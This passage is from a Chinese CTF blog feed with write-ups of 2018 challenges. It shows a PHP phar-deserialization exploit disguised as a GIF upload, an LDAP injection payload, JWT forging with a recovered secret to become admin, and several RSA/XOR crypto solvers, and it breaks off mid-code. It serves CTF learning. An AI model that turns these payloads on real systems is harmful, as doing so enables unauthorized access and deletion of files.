class="keyword">$this</span>-&gt;getPath())) &#123;</span><br><span class="line">            @unlink(<span class="keyword">$this</span>-&gt;getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream();</span><br><span class="line">$p = <span class="keyword">new</span> Phar(<span class="string">'./1.phar'</span>, <span class="number">0</span>);</span><br><span class="line">$p-&gt;startBuffering();</span><br><span class="line">$p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$p-&gt;setMetadata($obj);</span><br><span class="line">$p-&gt;addFromString(<span class="string">'1.txt'</span>,<span class="string">'text'</span>);</span><br><span class="line">$p-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'./1.phar'</span>, <span class="string">'1.gif'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在目录下会生成一个 1.gif 文件，上传上去，发现文件列表有了这个文件：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-48e90640ead8c229.png" alt="image.png"></p><p>然后 check 一下，注意要抓包，添加一下 path 参数，详情看上面给出的 check 部分的代码。</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-aa1be94a39dd4dd5.png" alt="image.png"></p><p><code>path=phar:///usr/share/nginx/html/storage/app/public</code></p><p>触发反序列化，删除缓存文件，访问 flag 就可以看到 flag 了。</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-d556ca0fac6a99b8.png" alt="image.png"></p><p>参考：</p><ol><li><p><a href="https://www.kingkk.com/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AF-web/" target="_blank" rel="noopener">https://www.kingkk.com/2018/10/%E6%8A%A4%E7%BD%91%E6%9D%AF-web/</a></p></li><li><p><a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/" target="_blank" rel="noopener">http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/</a></p></li><li><p><a href="http://www.venenof.com/index.php/archives/565/" target="_blank" rel="noopener">http://www.venenof.com/index.php/archives/565/</a></p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>web 手已废。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA的一个小trick</title>
      <link href="/2018/10/14/RSA%E2%80%94%E2%80%94trick/"/>
      <url>/2018/10/14/RSA%E2%80%94%E2%80%94trick/</url>
      
        <content type="html"><![CDATA[<p>最近遇到了一个 RSA 的问题，涉及一个小小的 trick ，记录一下。</p><p>题目条件如下：</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">e=65537</span><br><span class="line">n1=23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L</span><br><span class="line">n2=23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154673727252437046185126099084752843732400209032782207790902956024459189700856089587545302854326571561755007254420608514135036673700243280752364319986331493694769729841789115612749641973878393284804681876299531933348630664123809944975501332215753682284226293973903784246618067269627749460102002825975011735463170307L</span><br><span class="line">encrypt=18605789682603602447496491798717321758798293700581905324029316650457391496265655270825055100678097929357061608642146193773598093988238186832894784951616085628646685595376101261377731258729834390380505295109894703902052847643842156614062711247564519297808798554671766259798926540994634858657655351713982599673967765484141456377356967352743349134262973092564982272405212241089526282547070247316071159193009664342169931360323767519419547890738439815871541842638219161372841320792826512207337857015266817573319095062799628537492791048391092577478382005012019416835632572465215950053539506334972912038960318318733757235757L</span><br></pre></td></tr></table></figure><p>发现给了两个 n，一个密文，那就是根据两个 n 来计算私钥。<br>首先尝试分解两个 n，n1 无果，n2 分出一部分素因数：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-30f8ea24352ecb27.png" alt="image.png"></p><p>显然 n2 不是两个素因数相乘，可以猜测 n1 是加密所用的 n。仔细观察 n1 和 n2 的高位都相同，相近，猜测n2可能是依据 n1 的 p 和 q 生成：</p><blockquote><p>n1 = p * q<br>n2 = (p + x) * (q + y)</p></blockquote><p>这样的话，可以推导：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p * q = n1</span><br><span class="line">(p + x)(q + y) = n2</span><br><span class="line">-&gt; x * y + p * y + q * x = t (t = n2 - n1)</span><br><span class="line">-&gt; x * q^2 + (x * y - t) * q + n * y = 0</span><br></pre></td></tr></table></figure><p>该方程有素数解即可，可爆破 x 和 y，写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n1=<span class="number">23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154545949713245271655372366964733467694911683404472839031932865195076679363440004259157441442904092160547940620462275523928770007343760308099893870201392965037704560065286860197211399375405419620507897112217284427055511050820476779226202266877872708788417574738346625361066145535064835057037859284000257460115692751L</span></span><br><span class="line">n2=<span class="number">23813929634961916607351565880455941766670447113389071712756695324346844628401731716721342593051007386272154527731664038624979611788014212477351852945244505409460937047258358062539110381430391840699958786987625931706228387994323041218966203797392082298285118826348211114759651033904573709571472601260689154673727252437046185126099084752843732400209032782207790902956024459189700856089587545302854326571561755007254420608514135036673700243280752364319986331493694769729841789115612749641973878393284804681876299531933348630664123809944975501332215753682284226293973903784246618067269627749460102002825975011735463170307L</span></span><br><span class="line">encrypt=<span class="number">18605789682603602447496491798717321758798293700581905324029316650457391496265655270825055100678097929357061608642146193773598093988238186832894784951616085628646685595376101261377731258729834390380505295109894703902052847643842156614062711247564519297808798554671766259798926540994634858657655351713982599673967765484141456377356967352743349134262973092564982272405212241089526282547070247316071159193009664342169931360323767519419547890738439815871541842638219161372841320792826512207337857015266817573319095062799628537492791048391092577478382005012019416835632572465215950053539506334972912038960318318733757235757L</span></span><br><span class="line"></span><br><span class="line">t=n2-n1</span><br><span class="line">f1 = <span class="keyword">lambda</span> x, y: pow(x * y - t, <span class="number">2</span>) - <span class="number">4</span> * n1 * x * y</span><br><span class="line">f2 = <span class="keyword">lambda</span> x, y, s: (t - x * y - s) / (<span class="number">2</span> * x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">3000</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">3000</span>):</span><br><span class="line">        <span class="keyword">print</span> x,y</span><br><span class="line">        <span class="keyword">if</span> f1(x, y) &gt;= <span class="number">0</span>:</span><br><span class="line">            s, b = gmpy2.iroot(f1(x, y), <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span> b:</span><br><span class="line">                <span class="keyword">if</span> gmpy2.is_prime(f2(x,y,int(s))):</span><br><span class="line">                    <span class="keyword">print</span> <span class="string">"Success"</span></span><br><span class="line">                    p=f2(x,y,int(s))</span><br><span class="line">                    q=n1/p</span><br><span class="line">                    d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">                    <span class="keyword">print</span> libnum.n2s(pow(encrypt,d,n1))</span><br><span class="line">                    exit()</span><br></pre></td></tr></table></figure><p>解出明文。</p><p>参考：<br><a href="https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/11/14/CTF%E4%B8%ADRSA%E5%A5%97%E8%B7%AF/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 CSAW</title>
      <link href="/2018/10/05/2018CSAW/"/>
      <url>/2018/10/05/2018CSAW/</url>
      
        <content type="html"><![CDATA[<p>之前9月份事情很多没有打CSAW ，听说题质量不错就去做了做，不会的就去复现了一波，跟着师傅们的wp学到了不少东西。</p><a id="more"></a><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Ldab"><a href="#Ldab" class="headerlink" title="Ldab"></a>Ldab</h4><p>这道题开始做的时候试了一波注入姿势，没有什么卵用，后来才知道考察的是 LDAP 的注入。</p><p>关于 LDAP 及注入的知识点，可以参考这几篇博客：</p><ol><li><p><a href="https://www.jianshu.com/p/d94673be9ed0" target="_blank" rel="noopener">https://www.jianshu.com/p/d94673be9ed0</a></p></li><li><p><a href="http://blog.51cto.com/407711169/1439623" target="_blank" rel="noopener">http://blog.51cto.com/407711169/1439623</a></p></li><li><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20injection" target="_blank" rel="noopener"> LDAP 注入常用payload</a></p></li></ol><p>看这道题，flag 应该就藏在某一项中，试一下查出所有项：</p><blockquote><p>*)(uid=*</p></blockquote><p>没有 flag，应该是做了什么过滤，猜测后台查询语句可能是这样的：</p><blockquote><p>(&amp;(name=输入)(name!=flag))</p></blockquote><p>在&amp;的条件下，我们的 payload 带入，变为</p><blockquote><p>(&amp;(name=*)(uid=*)(name!=flag))</p></blockquote><p>flag 依然无法查询到。</p><p>所以思路是闭合掉前面的 &amp;，再构造一个查询语句，payload：</p><blockquote><p>*)(uid=*))(|(uid=*</p></blockquote><p>代入查询语句变为：</p><blockquote><p>(&amp;(name=*)(uid=*))(|(uid=*)(name!=flag))</p></blockquote><p>这样过滤flag前面限制变成了 “ | “，查询到flag：</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f60930ebc4a38854.png" alt=""></p><blockquote><p>flag{ld4p_inj3ction_i5_a_th1ng}</p></blockquote><h4 id="sso"><a href="#sso" class="headerlink" title="sso"></a>sso</h4><p>题目描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Don&apos;t you love undocumented APIs</span><br><span class="line">Be the admin you were always meant to be</span><br><span class="line">http://web.chal.csaw.io:9000</span><br><span class="line">Update chal description at: 4:38 to include solve details</span><br><span class="line">Aesthetic update for chal at Sun 7:25 AM</span><br></pre></td></tr></table></figure><p>查看源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/protected"</span>&gt;</span>.<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guess</span></span><br><span class="line"><span class="comment">POST /oauth2/token</span></span><br><span class="line"><span class="comment">POST /oauth2/authorize form-data <span class="doctag">TODO:</span> make a form for this route</span></span><br><span class="line"><span class="comment">--!&gt;</span></span><br></pre></td></tr></table></figure><p>应该是基于 OAuth2.0 协议的身份验证，去补一波知识…</p><p>关于OAuth2.0的知识，可以参考以下几篇博客：</p><ol><li><p><a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener"> 阮一峰的博客 </a></p></li><li><p><a href="https://blog.csdn.net/cd_xuyue/article/details/52084220" target="_blank" rel="noopener"> OAuth 2.0攻击方法 </a></p></li></ol><p>这道题涉及的验证模式是授权码模式。流程如下：</p><blockquote><ol><li>用户访问客户端，后者将前者导向认证服务器。</li><li>用户选择是否给予客户端授权。</li><li>假设用户给予授权，认证服务器将用户导向客户端事先指定的”重定向 URI “（redirection URI），同时附上一个授权码。</li><li>客户端收到授权码，附上早先的”重定向URI”，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。</li></ol></blockquote><p>分析此题，我们要拿到 token 去访问 <a href="http://web.chal.csaw.io:9000/protected" target="_blank" rel="noopener">http://web.chal.csaw.io:9000/protected</a> 得到flag，过程基本如下：</p><blockquote><p>先去访问 /oauth2/authorize，构造 Post 请求拿到 code，带着这个code去访问 /oauth2/token，得到token去访问 /oauth2/protected 去找flag。</p></blockquote><p>首先访问 /oauth2/authorize，注意要在 Post 请求中加 “response_type=code”。redirect_uri 是重定向的url，与后面填的一致就可以。<br><img src="https://upload-images.jianshu.io/upload_images/9223743-6287369d8474853e.png" alt="image.png"></p><p>拿着这个 code 去访问 /oauth2/token，注意 Post 参数的格式：<br><img src="https://upload-images.jianshu.io/upload_images/9223743-08fa881ad66e7d90.png" alt="image.png"><br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant_type=authorization_code&amp;code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzODk3OTY4OCwiZXhwIjoxNTM4OTgwMjg4fQ.EmiNRIdeLAij3UUnBP2763GTsBtu-BFMi14yAoQRWFk&amp;redirect_uri=http://web.chal.csaw.io:9000/protected</span><br></pre></td></tr></table></figure><p>得到 token，进行 <a href="https://jwt.io/" target="_blank" rel="noopener">jwt 在线解码</a>:<br><img src="https://upload-images.jianshu.io/upload_images/9223743-991d446b936a73b2.png" alt="image.png"><br>这里的 ufoundme! 就是加密的密钥，根据题目提示把 user 改为 admin ,下面密钥换成 ufoundme!<br><img src="https://upload-images.jianshu.io/upload_images/9223743-155a7de326b70296.png" alt="image.png"><br>拿着这个新的 token 去访问 <a href="http://web.chal.csaw.io:9000/protected" target="_blank" rel="noopener">http://web.chal.csaw.io:9000/protected</a> 得到flag:<br><img src="https://upload-images.jianshu.io/upload_images/9223743-6c8250f661ce4a35.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag: flag&#123;JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods&#125;</span><br></pre></td></tr></table></figure><p>参考：</p><ol><li><p><a href="https://www.secpulse.com/archives/75785.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/75785.html</a></p></li><li><p><a href="https://delcoding.github.io/2018/09/csaw-writeup2/" target="_blank" rel="noopener">https://delcoding.github.io/2018/09/csaw-writeup2/</a></p></li></ol><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h4><p>题目描述：</p><blockquote><p>yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet<br>single yeet yeeted with single yeet == 0<br>yeeet<br>what is yeet?<br>yeet is yeet<br>Yeetdate: yeeted yeet at yeet: 9:42 pm</p></blockquote><p>密文给了一串base64:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg==</span><br></pre></td></tr></table></figure><p>密文解码是乱码</p><p>说了这么多，yeet 到底是什么，通过第二句猜测可能是异或(自己和自己 yeet 为0)</p><p>逐字节异或 只有 256 种情况，写出爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">ciphertext=<span class="string">"s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg=="</span></span><br><span class="line">cipher=base64.b64decode(ciphertext)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    result=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> cipher:</span><br><span class="line">        result+=chr(ord(s)^i)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">print</span> result</span><br></pre></td></tr></table></figure><blockquote><p>flag: flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}</p></blockquote><h4 id="lowe"><a href="#lowe" class="headerlink" title="lowe"></a>lowe</h4><blockquote><p>I personally prefer Home Depot<br>XOR Passes are the easiest way to use numbers to encrypt!<br>By Kris Kwiatkowski, Cloudflare</p></blockquote><p>附件有三个：</p><ul><li>file.enc</li><li>key.enc</li><li>pubkey.pem</li></ul><p><strong>file.enc</strong> 是一串 base64 编码，解码是一串乱码，看起来像是加密过。</p><blockquote><p>kStoynmN5LSniue0nDxli9csSrBgexZ/YOo5e+MUkfJKwvht8hHsYyMGVYzMlOp9sAFBrPCbm4UA4n7oMr2zlg==</p></blockquote><p><strong>key.enc</strong>是 1533bit 的一个数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">219135993109607778001201845084150602227376141082195657844762662508084481089986056048532133767792600470123444605795683268047281347474499409679660783370627652563144258284648474807381611694138314352087429271128942786445607462311052442015618558352506502586843660097471748372196048269942588597722623967402749279662913442303983480435926749879440167236197705613657631022920490906911790425443191781646744542562221829319509319404420795146532861393334310385517838840775182</span><br></pre></td></tr></table></figure><p><strong>pubkey.pem</strong> 是RSA公钥文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIHdMA0GCSqGSIb3DQEBAQUAA4HLADCBxwKBwQDPcH7tl5AXt/b0dv87plVZrbGC</span><br><span class="line">4Hz6IzOx7AVrf3uWEkBU8fV0iwTDaU6Q8Nmf7gWEqHpwgXWA1JOTMhuyCAf/3iWk</span><br><span class="line">yKvUbZXB43QNnmQf53+bls7K6RjmeiSJUrXaga53Qr2uUbEpJFlzQVBXrnXft1p4</span><br><span class="line">6CQ3nlJQZZLDdQ6aHH5wG+6N38epynJTTNOwlXn4ek6zdvkmfNGhbh5XkJXFuG9L</span><br><span class="line">jyT7YT8Ip+DkddJVVq5ByM7iSOkNrJZdxH3btMUCAQM=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>首先<a href="https://lapo.it/asn1js/" target="_blank" rel="noopener">在线提取</a>出 RSA 公钥的n和e (选择 openssl 提取也可以)。发现 n 是1536bit，而 e 仅仅为 3。<br><img src="https://upload-images.jianshu.io/upload_images/9223743-c677b694fd77ce05.png" alt="image.png"><br>分析以上条件，不难得出 key.enc 是 RSA 加密的 c，位数相近。 此题 e 这么小，猜想可能直接开三次方开出来，或者 <em>*c + i\</em> n **能够直接开三次方，其中 i 穷举。</p><p>试了一下发现成功，得到 RSA 明文 m，根据题目提示和 file.enc 进行异或，得到 flag，解题脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import base64</span><br><span class="line">import libnum</span><br><span class="line">n=1953100985460341348696462250270875098931515807146586756296095446519328460202594322688077959911801412881736536007030245814199784734114468379391959242638228445246656155129859794350223734103552981321896683545886584718379382489138858499065228901412805708175575610007278296746952620830529848517741610397035368508736304074009571123132231492002047409382240786830369954266084929667038697671614351425836882238175963587766360974168461069129309445949172255481878016805287109</span><br><span class="line">e=3</span><br><span class="line">key=219135993109607778001201845084150602227376141082195657844762662508084481089986056048532133767792600470123444605795683268047281347474499409679660783370627652563144258284648474807381611694138314352087429271128942786445607462311052442015618558352506502586843660097471748372196048269942588597722623967402749279662913442303983480435926749879440167236197705613657631022920490906911790425443191781646744542562221829319509319404420795146532861393334310385517838840775182</span><br><span class="line">data=base64.b64decode(open(&quot;file.enc&quot;,&quot;rb&quot;).read())</span><br><span class="line">data=int(data.encode(&quot;hex&quot;),16)</span><br><span class="line">for i in range(10000):</span><br><span class="line">    if gmpy2.iroot(key+i*n,e)[1]:</span><br><span class="line">        m=gmpy2.iroot(key+i*n,e)[0]</span><br><span class="line">plain=libnum.n2s(m^data)</span><br><span class="line">print plain</span><br></pre></td></tr></table></figure><blockquote><p>flag: flag{saltstacksaltcomit5dd304276ba5745ec21fc1e6686a0b28da29e6fc}</p></blockquote><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="bin-t"><a href="#bin-t" class="headerlink" title="bin_t"></a>bin_t</h4><p>题目描述：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Binary trees let you do some interesting things. Can you balance a tree?</span><br><span class="line">nc misc.chal.csaw.io 9001</span><br><span class="line">Equal nodes should be inserted to the right of the parent node. You should balance the tree as you add nodes.</span><br></pre></td></tr></table></figure><p>ACM入门级，AVL树的生成和树的前序遍历，贴上python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.data=<span class="number">0</span></span><br><span class="line">        self.left=<span class="literal">None</span></span><br><span class="line">        self.right=<span class="literal">None</span></span><br><span class="line">        self.height=<span class="number">0</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BTree</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.root=<span class="literal">None</span></span><br><span class="line">        self.result=<span class="string">""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__Max</span><span class="params">(self,h1,h2)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> h1&gt;h2:</span><br><span class="line">            <span class="keyword">return</span> h1</span><br><span class="line">        <span class="keyword">elif</span> h1&lt;=h2:</span><br><span class="line">            <span class="keyword">return</span> h2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__LL</span><span class="params">(self,r)</span>:</span><span class="comment">#左左情况，向右旋转</span></span><br><span class="line">        node=r.left</span><br><span class="line">        r.left=node.right</span><br><span class="line">        node.right=r</span><br><span class="line">        r.height=self.__Max(self.getHeight(r.right),self.getHeight(r.left))+<span class="number">1</span></span><br><span class="line">        node.height=self.__Max(self.getHeight(node.right),self.getHeight(node.left))+<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> node</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__RR</span><span class="params">(self,r)</span>:</span><span class="comment">#右右，左旋</span></span><br><span class="line">        node = r.right</span><br><span class="line">        r.right = 